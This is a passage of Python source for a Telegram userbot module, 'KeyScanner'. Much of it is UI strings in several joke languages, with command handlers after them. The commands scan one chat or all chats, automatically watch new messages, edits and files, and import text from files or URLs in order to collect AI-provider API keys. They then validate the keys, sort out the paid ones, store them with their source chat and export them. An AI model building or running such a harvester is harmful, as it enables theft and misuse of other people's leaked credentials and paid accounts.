        "state_on": "ON",
        "state_off": "OFF",
    }

    strings_neofit = {
        "scanning":      f"{E_SLOW} <b>Scanning keys, boss...</b>\n{E_FOLD} Searching up to {{limit}} messages per prefix.",
        "found":         f"{E_OK} <b>Scan finished nice.</b>\n{E_FIRE} Valid keys found: <b>{{valid_count}}</b>\n{E_BATT} Saved in database.",
        "auto_on":       f"{E_BELL} Auto-catch <b>enabled</b> for this chat.\n{E_MSG} Watching: new msgs · edits · files",
        "auto_off":      f"{E_MUTE} Auto-catch <b>disabled</b> for this chat.",
        "auto_on_global":  f"{E_BELL} Global auto-catch <b>enabled</b>.\n{E_MSG} Now watching new msgs, edits and files in <b>all chats</b>.",
        "auto_off_global": f"{E_MUTE} Global auto-catch <b>disabled</b>.",
        "db_stats":      f"{E_BOX} <b>Key base:</b> {{total}} keys\n{E_CARD} Paid: <b>{{paid}}</b>  {E_BATT} Free: <b>{{free}}</b>  ❓ Unknown: <b>{{unk}}</b>\n\n{E_GEAR} <b>Control menu:</b>",
        "stats":         f"{E_PIN} <b>Providers / keys / models:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Keys exported to Saved Messages.</b>",
        "empty":         f"{E_ERR} Key base is empty.",
        "deleted":       f"{E_TRASH} Key deleted.",
        "not_found":     f"{E_ERR} Key not found.",
        "btn_export":    "⬇️ Export",
        "btn_stats":     "📍 Stats",
        "btn_clear":     "🗑 Clear All",
        "btn_list":      "📝 Key List",
        "btn_check_all": "🔃 Check All",
        "btn_back":      "⬅️ Back",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Clear Invalid",
        "models_cache_missing": f"{E_ERR} <b>Model cache not ready yet.</b>\n{E_GEAR} Press <b>💳 Sort Paid / Free</b> first.",
        "log_target_help": f"{E_LINK} <b>Log chat is not set.</b>\nUse <code>.kslogchat &lt;chat link / @username / chat_id&gt; [topic title]</code>.",
        "log_target_set": f"{E_OK} <b>Log chat saved.</b>",
        "log_target_topic": f"{E_OK} <b>Forum topic ready.</b>",
        "log_target_label": f"{E_LINK} <b>Log target:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Log topic:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>No log topic.</b>",
        "btn_log_target": "🎯 Set Log Chat",
        "btn_log_topic": "🧵 Set Topic",
        "btn_log_help": "ℹ️ Log Help",
        "new_key_auto":  f"{E_BELL} <b>New key catched.</b>\nProvider: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Key list (page {{page}}/{{total_pages}} · {{sort_label}}):</b>",
        "key_info":      f"{E_PIN} <b>Key info:</b>\n\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_CARD} <b>Tier:</b> {{tier}}\n{E_LIST} <b>Models:</b> {{models}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Check Key",
        "btn_del_single":   "🗑 Delete Key",
        "checking_all":  f"{E_SYNC} <b>Checking {{total}} keys now...</b>",
        "check_res_all": f"{E_OK} <b>Check finished nice</b>\n\n<b>Total:</b> {{total}}\n<b>Valid:</b> {{v}}\n<b>Invalid:</b> {{i}}\n\n{E_PIN} <b>Providers:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Result is here:</b>\n\n<b>Provider:</b> {{provider}}\n<b>Status:</b> {{status}}",
        "status_valid":   f"{E_OK} Valid",
        "status_invalid": f"{E_ERR} Invalid",
        "importing":     f"{E_SYNC} <b>Importing keys...</b>",
        "imported":      f"{E_OK} <b>Imported {{count}} unique keys.</b>",
        "import_err":    f"{E_ERR} Reply to a msg/file or give raw URL.",
        "btn_settings":  "⚙️ Settings",
        "settings_title": f"{E_GEAR} <b>Settings:</b>\n\n{E_BELL} Logging: <b>{{log_mode}}</b>\n{E_FOLD} File scan: <b>{{file_scan}}</b>\n{E_SYNC} Edit scan: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Cycle Log Mode",
        "btn_toggle_file": "📂 Toggle File Scan",
        "btn_toggle_edit": "🔃 Toggle Edit Scan",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Creating topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Topic created</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Topic saved in DB</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Global scan started...</b>\nSearching all chats up to {{limit}} messages per prefix.",
        "new_key_notif": f"{E_BELL} <b>New key catched!</b>\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Source:</b> {{chat_id}}\n{E_RIGHT} <b>Via:</b> {{via}}",
        "btn_show_key":  "👁 Show",
        "btn_hide_key":  "🙈 Hide",
        "btn_filter_all":     "📝 All",
        "btn_filter_paid":    "💳 Paid",
        "btn_filter_free":    "🔋 Free",
        "btn_sort_recent":    "🕒 Fresh",
        "btn_sort_alpha":     "🔤 A-Z",
        "btn_sort_provider":  "🏷 Provider",
        "btn_sort_tier":      "💳 Tier",
        "sort_label_recent":   "Fresh",
        "sort_label_alpha":    "A-Z",
        "sort_label_provider": "Provider",
        "sort_label_tier":     "Tier",
        "btn_sort_paid_free": "💳 Sort Paid / Free",
        "btn_del_free":       "🗑 Delete Free",
        "btn_del_paid":       "🗑 Delete Paid",
        "btn_exp_paid":       "💳 Export Paid",
        "btn_exp_free":       "🔋 Export Free",
        "sorting":       f"{E_SYNC} <b>Sorting keys by paid/free...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Sort finished!</b>\n\n{E_CARD} <b>Paid:</b> {{paid}}\n{E_BATT} <b>Free:</b> {{free}}\n❓ <b>Unknown:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Deleted <b>{{count}}</b> keys.",
    }

    strings_tiktok = {
        "scanning":      f"{E_SLOW} <b>сканим кейсы...</b>\n{E_FOLD} ищем до {{limit}} сообщений на префикс.",
        "found":         f"{E_OK} <b>скан готов!</b>\n{E_FIRE} валид кейсов: <b>{{valid_count}}</b>\n{E_BATT} сохранено в дб.",
        "auto_on":       f"{E_BELL} авто скан <b>вкл</b>.\n{E_MSG} ловлю: месаги · едиты · файлы",
        "auto_off":      f"{E_MUTE} авто скан <b>выкл</b>.",
        "db_stats":      f"{E_BOX} <b>дб:</b> {{total}} кейсов\n{E_CARD} пейд: <b>{{paid}}</b>  {E_BATT} фри: <b>{{free}}</b>  ❓ анноун: <b>{{unk}}</b>\n\n{E_GEAR} <b>менеджмент:</b>",
        "stats":         f"{E_PIN} <b>провайдеры / кейсы / модели:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>кейсы экспортнул в сейвед!</b>",
        "empty":         f"{E_ERR} дб пустая.",
        "deleted":       f"{E_TRASH} кей удалён.",
        "not_found":     f"{E_ERR} кей не найден.",
        "btn_export":    "⬇️ экспорт",
        "btn_stats":     "📍 статы",
        "btn_clear":     "🗑 клир ол",
        "btn_list":      "📝 лист",
        "btn_check_all": "🔃 валидейт ол",
        "btn_back":      "⬅️ бек",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 клир инвалид",
        "models_cache_missing": f"{E_ERR} <b>модел кэш не реди.</b>\n{E_GEAR} сначала нажми <b>💳 сорт пейд/фри</b>.",
        "log_target_help": f"{E_LINK} <b>лог чат не сетнут.</b>\nюзай <code>.kslogchat</code> чтобы сетнуть.",
        "log_target_set": f"{E_OK} <b>лог чат сейвнут.</b>",
        "log_target_topic": f"{E_OK} <b>форум топик реди.</b>",
        "log_target_label": f"{E_LINK} <b>лог таргет:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>лог топик:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>топика нет.</b>",
        "btn_log_target": "🎯 сет лог чат",
        "btn_log_topic": "🧵 сет топик",
        "btn_log_help": "ℹ️ хелп",
        "new_key_auto":  f"{E_BELL} <b>авто кетчнул кей!</b>\nпровайдер: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>лист кейсов (пейдж {{page}}/{{total_pages}}):</b>",
        "key_info":      f"{E_PIN} <b>кей инфо:</b>\n\n{E_TAG} <b>провайдер:</b> {{provider}}\n{E_CARD} <b>тир:</b> {{tier}}\n{E_LIST} <b>модели:</b> {{models}}\n{E_LOCK} <b>кей:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 чекнуть",
        "btn_del_single":   "🗑 делитнуть",
        "checking_all":  f"{E_SYNC} <b>валидейтим {{total}} кейсов...</b>",
        "check_res_all": f"{E_OK} <b>валидейшн дан</b>\n\n<b>тотал:</b> {{total}}\n<b>валид:</b> {{v}}\n<b>инвалид:</b> {{i}}\n\n{E_PIN} <b>провайдеры:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>резалт:</b>\n\n<b>провайдер:</b> {{provider}}\n<b>статус:</b> {{status}}",
        "status_valid":   f"{E_OK} валид",
        "status_invalid": f"{E_ERR} инвалид",
        "importing":     f"{E_SYNC} <b>импортим кейсы...</b>",
        "imported":      f"{E_OK} <b>импортнул {{count}} кейсов.</b>",
        "import_err":    f"{E_ERR} реплай на месагу/файл или кинь raw урл.",
        "btn_settings":  "⚙️ сеттингс",
        "settings_title": f"{E_GEAR} <b>сеттингс:</b>\n\n{E_BELL} логи: <b>{{log_mode}}</b>\n{E_FOLD} файл скан: <b>{{file_scan}}</b>\n{E_SYNC} едит скан: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 сменить лог мод",
        "btn_toggle_file": "📂 тоггл файл скан",
        "btn_toggle_edit": "🔃 тоггл едит скан",
        "log_mode_heroku": "херок",
        "log_mode_custom": "кастом",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] криейтим топик</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] топик криейтнут</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] топик сейвнут в дб</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>глобал скан...</b>\nищу во всех чатах до {{limit}} на префикс.",
        "new_key_notif": f"{E_BELL} <b>кей кетчнут!</b>\n{E_TAG} <b>провайдер:</b> {{provider}}\n{E_LOCK} <b>кей:</b> <code>{{key}}</code>\n{E_FOLD2} <b>сорс:</b> {{chat_id}}\n{E_RIGHT} <b>виа:</b> {{via}}",
        "btn_show_key":  "👁 шоу",
        "btn_hide_key":  "🙈 хайд",
        "btn_filter_all":     "📝 ол",
        "btn_filter_paid":    "💳 пейд",
        "btn_filter_free":    "🔋 фри",
        "btn_sort_paid_free": "💳 сорт пейд/фри",
        "btn_del_free":       "🗑 делит фри",
        "btn_del_paid":       "🗑 делит пейд",
        "btn_exp_paid":       "💳 экспорт пейд",
        "btn_exp_free":       "🔋 экспорт фри",
        "sorting":       f"{E_SYNC} <b>сортим...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>сорт дан!</b>\n\n{E_CARD} <b>пейд:</b> {{paid}}\n{E_BATT} <b>фри:</b> {{free}}\n❓ <b>анноун:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} делитнул <b>{{count}}</b> кейсов.",
    }

    strings_leet = {
        "scanning":      f"{E_SLOW} <b>5c4nn1ng k3y5...</b>\n{E_FOLD} 5e4rch1ng up t0 {{limit}} m5g5 p3r pr3f1x.",
        "found":         f"{E_OK} <b>5c4n c0mpl3t3!</b>\n{E_FIRE} v4l1d k3y5: <b>{{valid_count}}</b>\n{E_BATT} 54v3d t0 d8.",
        "auto_on":       f"{E_BELL} 4ut0-5c4n <b>0n</b>.\n{E_MSG} c4tch1ng: m5g5 · 3d1t5 · f1l35",
        "auto_off":      f"{E_MUTE} 4ut0-5c4n <b>0ff</b>.",
        "db_stats":      f"{E_BOX} <b>d8:</b> {{total}} k3y5\n{E_CARD} p41d: <b>{{paid}}</b>  {E_BATT} fr33: <b>{{free}}</b>  ❓ unkn0wn: <b>{{unk}}</b>\n\n{E_GEAR} <b>m3nu:</b>",
        "stats":         f"{E_PIN} <b>pr0v1d3r5 / k3y5 / m0d3l5:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>k3y5 3xp0rt3d t0 54v3d!</b>",
        "empty":         f"{E_ERR} d8 15 3mpty.",
        "deleted":       f"{E_TRASH} k3y r3m0v3d.",
        "not_found":     f"{E_ERR} k3y n0t f0und.",
        "btn_export":    "⬇️ 3xp0rt",
        "btn_stats":     "📍 5t4t5",
        "btn_clear":     "🗑 cl34r 4ll",
        "btn_list":      "📝 l15t",
        "btn_check_all": "🔃 v4l1d4t3 4ll",
        "btn_back":      "⬅️ b4ck",
        "btn_exp_json":  "J50N",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 cl34r 1nv4l1d",
        "models_cache_missing": f"{E_ERR} <b>m0d3l c4ch3 n0t r34dy.</b>\n{E_GEAR} pr355 <b>💳 50rt p41d/fr33</b> f1r5t.",
        "log_target_help": f"{E_LINK} <b>l0g ch4t n0t 53t.</b>\nu53 <code>.kslogchat</code> t0 53t 1t.",
        "log_target_set": f"{E_OK} <b>l0g ch4t 54v3d.</b>",
        "log_target_topic": f"{E_OK} <b>f0rum t0p1c r34dy.</b>",
        "log_target_label": f"{E_LINK} <b>l0g t4rg3t:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>l0g t0p1c:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>n0 l0g t0p1c.</b>",
        "btn_log_target": "🎯 53t l0g ch4t",
        "btn_log_topic": "🧵 53t t0p1c",
        "btn_log_help": "ℹ️ h3lp",
        "new_key_auto":  f"{E_BELL} <b>4ut0-c4ught k3y!</b>\npr0v1d3r: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>k3y l15t (p4g3 {{page}}/{{total_pages}}):</b>",
        "key_info":      f"{E_PIN} <b>k3y 1nf0:</b>\n\n{E_TAG} <b>pr0v1d3r:</b> {{provider}}\n{E_CARD} <b>t13r:</b> {{tier}}\n{E_LIST} <b>m0d3l5:</b> {{models}}\n{E_LOCK} <b>k3y:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 ch3ck k3y",
        "btn_del_single":   "🗑 d3l3t3 k3y",
        "checking_all":  f"{E_SYNC} <b>v4l1d4t1ng {{total}} k3y5...</b>",
        "check_res_all": f"{E_OK} <b>v4l1d4t10n d0n3</b>\n\n<b>t0t4l:</b> {{total}}\n<b>v4l1d:</b> {{v}}\n<b>1nv4l1d:</b> {{i}}\n\n{E_PIN} <b>pr0v1d3r5:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>r35ult:</b>\n\n<b>pr0v1d3r:</b> {{provider}}\n<b>5t4tu5:</b> {{status}}",
        "status_valid":   f"{E_OK} v4l1d",
        "status_invalid": f"{E_ERR} 1nv4l1d",
        "importing":     f"{E_SYNC} <b>1mp0rt1ng k3y5...</b>",
        "imported":      f"{E_OK} <b>1mp0rt3d {{count}} k3y5.</b>",
        "import_err":    f"{E_ERR} r3ply t0 4 m5g/f1l3 0r g1v3 4 r4w url.",
        "btn_settings":  "⚙️ 53tt1ng5",
        "settings_title": f"{E_GEAR} <b>53tt1ng5:</b>\n\n{E_BELL} l0gg1ng: <b>{{log_mode}}</b>\n{E_FOLD} f1l3 5c4n: <b>{{file_scan}}</b>\n{E_SYNC} 3d1t 5c4n: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 cycl3 l0g m0d3",
        "btn_toggle_file": "📂 t0ggl3 f1l3 5c4n",
        "btn_toggle_edit": "🔃 t0ggl3 3d1t 5c4n",
        "log_mode_heroku": "h3r0ku",
        "log_mode_custom": "cu5t0m",
        "heroku_topic_creating": f"{E_GEAR} <b>[K3y5c4nn3r] cr34t1ng t0p1c</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[K3y5c4nn3r] t0p1c cr34t3d</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[K3y5c4nn3r] t0p1c 54v3d</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "Th15 t0p1c 15 f0r 4ut0m4t1c k3y l0g5.",
        "global_scanning": f"{E_SLOW} <b>gl0b4l 5c4n...</b>\n534rch1ng 4ll ch4t5 up t0 {{limit}} p3r pr3f1x.",
        "new_key_notif": f"{E_BELL} <b>n3w k3y c4ught!</b>\n{E_TAG} <b>pr0v1d3r:</b> {{provider}}\n{E_LOCK} <b>k3y:</b> <code>{{key}}</code>\n{E_FOLD2} <b>50urc3:</b> {{chat_id}}\n{E_RIGHT} <b>v14:</b> {{via}}",
        "btn_show_key":  "👁 5h0w",
        "btn_hide_key":  "🙈 h1d3",
        "btn_filter_all":     "📝 4ll",
        "btn_filter_paid":    "💳 p41d",
        "btn_filter_free":    "🔋 fr33",
        "btn_sort_paid_free": "💳 50rt p41d/fr33",
        "btn_del_free":       "🗑 d3l fr33",
        "btn_del_paid":       "🗑 d3l p41d",
        "btn_exp_paid":       "💳 3xp p41d",
        "btn_exp_free":       "🔋 3xp fr33",
        "sorting":       f"{E_SYNC} <b>50rt1ng...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>50rt3d!</b>\n\n{E_CARD} <b>p41d:</b> {{paid}}\n{E_BATT} <b>fr33:</b> {{free}}\n❓ <b>unkn0wn:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} d3l3t3d <b>{{count}}</b> k3y5.",
    }

    strings_uwu = {
        "scanning":      f"{E_SLOW} <b>scanning keyyyys uwu OwO</b>\n{E_FOLD} wooking fow up to {{limit}} msgs per pwefix >w<",
        "found":         f"{E_OK} <b>aww done!! uwu</b>\n{E_FIRE} vawid keys: <b>{{valid_count}}</b> :3\n{E_BATT} saved to db OwO",
        "auto_on":       f"{E_BELL} auto-scan <b>on</b> uwu\n{E_MSG} catching evewything >w<",
        "auto_off":      f"{E_MUTE} auto-scan <b>off</b> :c",
        "db_stats":      f"{E_BOX} <b>key db uwu:</b> {{total}}\n{E_CARD} paid: <b>{{paid}}</b>  {E_BATT} fwee: <b>{{free}}</b>  ❓ idk: <b>{{unk}}</b>\n\n{E_GEAR} <b>menu OwO:</b>",
        "stats":         f"{E_PIN} <b>pwoviders / keys / modews uwu:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>keys expowted to saved uwu!!</b>",
        "empty":         f"{E_ERR} db is empty :c no keys here uwu",
        "deleted":       f"{E_TRASH} key wemoved uwu.",
        "not_found":     f"{E_ERR} key not found :c uwu",
        "btn_export":    "⬇️ expowt",
        "btn_stats":     "📍 stats uwu",
        "btn_clear":     "🗑 cweaw aww",
        "btn_list":      "📝 wist",
        "btn_check_all": "🔃 vawidate aww",
        "btn_back":      "⬅️ back",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 cweaw invawid",
        "models_cache_missing": f"{E_ERR} <b>modew cache not weady uwu.</b>\n{E_GEAR} pwess <b>💳 sowt paid/fwee</b> fiwst :3",
        "log_target_help": f"{E_LINK} <b>wog chat not set uwu.</b>\nuse <code>.kslogchat</code> to set it >w<",
        "log_target_set": f"{E_OK} <b>wog chat saved uwu!!</b>",
        "log_target_topic": f"{E_OK} <b>fowum topic weady uwu!!</b>",
        "log_target_label": f"{E_LINK} <b>wogging to:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>topic uwu:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>no topic :c uwu</b>",
        "btn_log_target": "🎯 set wog chat",
        "btn_log_topic": "🧵 topic titwe",
        "btn_log_help": "ℹ️ hewp uwu",
        "new_key_auto":  f"{E_BELL} <b>new key caught uwu!!</b>\npwovider: <b>{{provider}}</b> :3",
        "list_title":    f"{E_LIST} <b>key wist (page {{page}}/{{total_pages}}) uwu:</b>",
        "key_info":      f"{E_PIN} <b>key info uwu:</b>\n\n{E_TAG} <b>pwovider:</b> {{provider}}\n{E_CARD} <b>tier:</b> {{tier}}\n{E_LIST} <b>modews:</b> {{models}}\n{E_LOCK} <b>key:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 check",
        "btn_del_single":   "🗑 dewete",
        "checking_all":  f"{E_SYNC} <b>vawidating {{total}} keys uwu...</b>",
        "check_res_all": f"{E_OK} <b>done uwu!!</b>\n\n<b>totaw:</b> {{total}}\n<b>vawid:</b> {{v}} :3\n<b>invawid:</b> {{i}} :c\n\n{E_PIN} <b>pwoviders:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>wesuwt uwu:</b>\n\n<b>pwovider:</b> {{provider}}\n<b>status:</b> {{status}}",
        "status_valid":   f"{E_OK} vawid :3",
        "status_invalid": f"{E_ERR} invawid :c",
        "importing":     f"{E_SYNC} <b>impowting keys uwu...</b>",
        "imported":      f"{E_OK} <b>impowted {{count}} keys uwu!!</b>",
        "import_err":    f"{E_ERR} wepwy to a msg/fiwe ow give a waw uww >w<",
        "btn_settings":  "⚙️ settings uwu",
        "settings_title": f"{E_GEAR} <b>settings uwu:</b>\n\n{E_BELL} wogging: <b>{{log_mode}}</b>\n{E_FOLD} fiwe scan: <b>{{file_scan}}</b>\n{E_SYNC} edit scan: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 cycwe wog mode",
        "btn_toggle_file": "📂 toggwe fiwe scan",
        "btn_toggle_edit": "🔃 toggwe edit scan",
        "log_mode_heroku": "hewoku uwu",
        "log_mode_custom": "custom :3",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] cweating topic uwu</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] topic cweated uwu!!</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] topic saved uwu</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs uwu. The first message is pinned >w<",
        "global_scanning": f"{E_SLOW} <b>gwobaw scan uwu...</b>\nsearching aww chats up to {{limit}} per pwefix OwO.",
        "new_key_notif": f"{E_BELL} <b>new key caught uwu!!</b>\n{E_TAG} <b>pwovider:</b> {{provider}}\n{E_LOCK} <b>key:</b> <code>{{key}}</code>\n{E_FOLD2} <b>souwce:</b> {{chat_id}}\n{E_RIGHT} <b>via:</b> {{via}}",
        "btn_show_key":  "👁 show uwu",
        "btn_hide_key":  "🙈 hide",
        "btn_filter_all":     "📝 aww",
        "btn_filter_paid":    "💳 paid",
        "btn_filter_free":    "🔋 fwee",
        "btn_sort_paid_free": "💳 sowt paid/fwee",
        "btn_del_free":       "🗑 dewete fwee",
        "btn_del_paid":       "🗑 dewete paid",
        "btn_exp_paid":       "💳 expowt paid",
        "btn_exp_free":       "🔋 expowt fwee",
        "sorting":       f"{E_SYNC} <b>sowting uwu...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>sowted uwu!!</b>\n\n{E_CARD} <b>paid:</b> {{paid}}\n{E_BATT} <b>fwee:</b> {{free}}\n❓ <b>idk:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} deweted <b>{{count}}</b> keys uwu.",
    }

    @loader.command(
        ru_doc="[лимит] - Поиск ключей через поиск сообщений.",
        en_doc="[limit|global [limit]] - Fast key scan via Telegram search.",
        uk_doc="[ліміт] - Пошук ключів через пошук повідомлень.",
        de_doc="[Limit] - Schneller Schlüsselscan via Telegram-Suche.",
        jp_doc="[制限] - Telegram検索でキーをスキャン。",
        neofit_doc="[limit|global [limit]] - scan keys fast, can use global too.",
        tiktok_doc="[лимит] - сканим кейсы.",
        leet_doc="[l1m1t] - f45t k3y 5c4n v14 t3l3gr4m.",
        uwu_doc="[wimit] - fast key scan uwu.",
    )
    async def scanllm(self, message: Message):
        global_mode, limit = self._parse_scan_args(utils.get_args_raw(message), 500)
        await self._run_scan(message, limit=limit, global_mode=global_mode)

    @loader.command(
        ru_doc="[лимит] - Глобальный поиск ключей по всем диалогам.",
        en_doc="[limit] - Global key scan across all dialogs.",
        uk_doc="[ліміт] - Глобальний пошук ключів по всіх діалогах.",
        de_doc="[Limit] - Globaler Schlüsselscan über alle Dialoge.",
        jp_doc="[制限] - 全ダイアログでグローバルキースキャン。",
        neofit_doc="[limit] - global scan for keys in all dialogs.",
        tiktok_doc="[лимит] - глобал скан по всем чатам.",
        leet_doc="[l1m1t] - gl0b4l k3y 5c4n 4ll d14l0g5.",
        uwu_doc="[wimit] - gwobaw key scan uwu.",
    )
    async def scanglobal(self, message: Message):
        _, limit = self._parse_scan_args(utils.get_args_raw(message), 100)
        await self._run_scan(message, limit=limit, global_mode=True)

    @loader.command(
        ru_doc="[global] - Вкл/выкл авто-ловлю. global = во всех чатах",
        en_doc="[global] - Toggle auto-scan. global = all chats",
        uk_doc="Вкл/викл авто-ловлю",
        de_doc="Auto-Scan ein/ausschalten",
        jp_doc="自動スキャンのオン/オフ",
        neofit_doc="[global] - toggle auto-catch. global = all chats.",
        tiktok_doc="тоггл авто скан",
        leet_doc="t0ggl3 4ut0-5c4n",
        uwu_doc="toggwe auto-scan uwu",
    )
    async def autokeys(self, message: Message):
        args = (utils.get_args_raw(message) or "").strip().lower()
        global_mode = args in {"global", "all", "-g", "--global"}
        target = GLOBAL_AUTOCATCH if global_mode else message.chat_id
        enabled_key = "auto_on_global" if global_mode else "auto_on"
        disabled_key = "auto_off_global" if global_mode else "auto_off"

        if self._toggle_autocatch_target(target):
            await utils.answer(message, self.strings[enabled_key])
            if self._settings.get("log_mode") == "heroku":
                try:
                    await self._bootstrap_heroku_logs()
                except Exception:
                    pass
        else:
            await utils.answer(message, self.strings[disabled_key])

    @loader.command(
        ru_doc="Переключить режим логирования",
        en_doc="Cycle log mode",
        uk_doc="Переключити режим логування",
        de_doc="Log-Modus wechseln",
        jp_doc="ログモードを切り替え",
        neofit_doc="Сменить режим логов братан",
        tiktok_doc="сменить лог мод",
        leet_doc="cycl3 l0g m0d3",
        uwu_doc="cycwe wog mode uwu",
    )
    async def kslog(self, message: Message):
        modes   = ["none", "saved", "heroku", "custom"]
        cur     = self._settings.get("log_mode", "none")
        if cur not in modes:
            cur = "none"
        nxt     = modes[(modes.index(cur) + 1) % len(modes)]
        self._settings["log_mode"] = nxt
        self._save()
        if nxt == "heroku":
            try:
                await self._bootstrap_heroku_logs()
            except Exception:
                pass
        await utils.answer(message, f"{E_BELL} <b>Logging →</b> <b>{nxt.upper()}</b>")

    @loader.command(
        ru_doc="Удалить все невалидные ключи",
        en_doc="Remove all invalid keys",
        uk_doc="Видалити всі невалідні ключі",
        de_doc="Alle ungültigen Schlüssel entfernen",
        jp_doc="無効なキーを全て削除",
        neofit_doc="Снести весь невалид братан",
        tiktok_doc="делит инвалид кейсы",
        leet_doc="r3m0v3 4ll 1nv4l1d k3y5",
        uwu_doc="wemove aww invawid keys uwu",
    )
    async def ksclean(self, message: Message):
        msg   = await utils.answer(message, self.strings["checking_all"].format(total=len(self._keys)))
        keys  = list(self._keys.keys())
        inv   = 0
        async with aiohttp.ClientSession() as session:
            results = await self._gather_chunked([self._validate_key(session, k) for k in keys])
            for k, (prov, ok) in zip(keys, results):
                if not ok:
                    inv += 1
                    self._keys.pop(k, None)
                    self._paid_status.pop(k, None)
        self._save()
        await utils.answer(msg, f"{E_OK} <b>Cleaned!</b> Removed: <b>{inv}</b>")

    @loader.command(
        ru_doc="<реплай/ссылка/текст> - Импорт ключей",
        en_doc="<reply/link/text> - Import keys",
        uk_doc="<реплай/посилання/текст> - Імпорт ключів",
        de_doc="<Antwort/Link/Text> - Schlüssel importieren",
        jp_doc="<リプライ/URL/テキスト> - キーをインポート",
        neofit_doc="<реплай/ссылка/текст> - Залить ключи братан",
        tiktok_doc="<реплай/урл/текст> - импортнуть кейсы",
        leet_doc="<r3ply/l1nk/t3xt> - 1mp0rt k3y5",
        uwu_doc="<wepwy/wink/text> - impowt keys uwu",
    )
    async def ksimport(self, message: Message):
        msg       = await utils.answer(message, self.strings["importing"])
        text_data = ""
        reply     = await message.get_reply_message()
        args      = utils.get_args_raw(message)

        if reply and reply.file:
            try:
                raw       = await self.client.download_media(reply, bytes)
                text_data = raw.decode("utf-8", errors="ignore")
            except Exception:
                pass
        elif reply and reply.raw_text:
            text_data = reply.raw_text
        elif args.startswith("http"):
            try:
                async with aiohttp.ClientSession() as s:
                    async with s.get(args, timeout=10) as r:
                        text_data = await r.text()
            except Exception:
                pass
        elif args:
            text_data = args

        if not text_data:
            return await utils.answer(msg, self.strings["import_err"])

        unique  = set(self.key_regex.findall(text_data))
        count   = 0
        async with aiohttp.ClientSession() as session:
            results = await self._gather_chunked([self._validate_key(session, k) for k in unique])
            for key, (prov, ok) in zip(unique, results):
                if ok and key not in self._keys:
                    count += 1
                    await self._register_key(session, key, prov, "Import", via="import")
        if count:
            self._save()
        await utils.answer(msg, self.strings["imported"].format(count=count))

    @loader.command(
        ru_doc="Меню ключей",
        en_doc="Keys menu",
        uk_doc="Меню ключів",
        de_doc="Schlüsselmenü",
        jp_doc="キーメニュー",
        neofit_doc="Меню ключей братан",
        tiktok_doc="менеджмент кейсов",
